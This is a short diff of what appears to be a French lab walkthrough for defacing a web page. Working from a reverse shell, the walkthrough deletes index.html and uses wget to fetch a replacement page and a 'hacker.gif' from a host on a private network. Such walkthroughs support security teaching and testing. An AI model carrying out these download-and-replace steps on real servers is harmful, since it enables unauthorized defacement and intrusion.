@@ -60,4 +60,4 @@ Depuis le reverse shell, supprimer index.html, puis télécharger les fichiers n
 
 > wget http://192.168.60.11:8000/index.html
 
-> wget http://192.168.60.11:8000/index.html
+> wget http://192.168.60.11:8000/hacker.gif
